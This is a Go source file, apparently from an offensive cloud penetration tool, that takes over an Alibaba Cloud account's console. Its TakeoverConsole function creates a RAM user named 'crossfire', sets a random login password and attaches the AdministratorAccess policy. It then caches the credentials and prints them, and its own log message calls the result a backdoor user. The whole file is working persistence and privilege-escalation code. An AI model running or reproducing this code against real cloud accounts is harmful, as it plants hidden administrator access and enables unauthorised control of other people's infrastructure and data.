package aliconsole

import (
	"fmt"
	"github.com/aliyun/alibaba-cloud-sdk-go/services/ram"
	log "github.com/sirupsen/logrus"
	"github.com/teamssix/cf/pkg/cloud"
	"github.com/teamssix/cf/pkg/cloud/alibaba/aliram"
	"github.com/teamssix/cf/pkg/util"
	"github.com/teamssix/cf/pkg/util/database"
	"github.com/teamssix/cf/pkg/util/errutil"
)

func CreateUser() {
	request := ram.CreateCreateUserRequest()
	request.Scheme = "https"
	request.UserName = "crossfire"
	_, err := aliram.RAMClient().CreateUser(request)
	errutil.HandleErrNoExit(err)
	if err == nil {
		log.Debugln("创建 crossfire 用户成功 (Create crossfire user successfully)")
	}
}

func CreateLoginProfile() string {
	request := ram.CreateCreateLoginProfileRequest()
	request.Scheme = "https"
	request.UserName = "crossfire"
	randomPasswords := util.GenerateRandomPasswords()
	request.Password = randomPasswords
	_, err := aliram.RAMClient().CreateLoginProfile(request)
	errutil.HandleErrNoExit(err)
	if err == nil {
		log.Debugln("成功为 crossfire 用户创建控制台登录密码 (Successfully created console login password for crossfire user)")
	}
	return randomPasswords
}

func AttachPolicyToUser() {
	request := ram.CreateAttachPolicyToUserRequest()
	request.Scheme = "https"
	request.PolicyType = "System"
	request.PolicyName = "AdministratorAccess"
	request.UserName = "crossfire"
	_, err := aliram.RAMClient().AttachPolicyToUser(request)
	errutil.HandleErrNoExit(err)
	if err == nil {
		log.Debugln("成功为 crossfire 用户赋予管理员权限 (Successfully grant AdministratorAccess policy to the crossfire user)")
	}
}

func GetAccountAlias() string {
	request := ram.CreateGetAccountAliasRequest()
	request.Scheme = "https"
	response, err := aliram.RAMClient().GetAccountAlias(request)
	errutil.HandleErrNoExit(err)
	accountAlias := response.AccountAlias
	return accountAlias
}

func TakeoverConsole() {
	CreateUser()
	password := CreateLoginProfile()
	AttachPolicyToUser()
	accountAlias := GetAccountAlias()
	userName := fmt.Sprintf("crossfire@%s", accountAlias)
	loginURL := "https://signin.aliyun.com"
	data := [][]string{
		{userName, password, loginURL},
	}
	database.InsertTakeoverConsoleCache("alibaba", accountAlias, userName, password, loginURL)
	var header = []string{"用户名 (User Name)", "密码 (Password)", "控制台登录地址 (Login Url)"}
	var td = cloud.TableData{Header: header, Body: data}
	cloud.PrintTable(td, "控制台接管信息")
	log.Infoln("接管控制台成功，接管控制台会创建 crossfire 后门用户，如果想删除该后门用户，请执行 cf alibaba console cancel 命令。(Successfully take over the console. Since taking over the console creates the backdoor user crossfire, if you want to delete the backdoor user, execute the command cf alibaba console cancel.)")
}
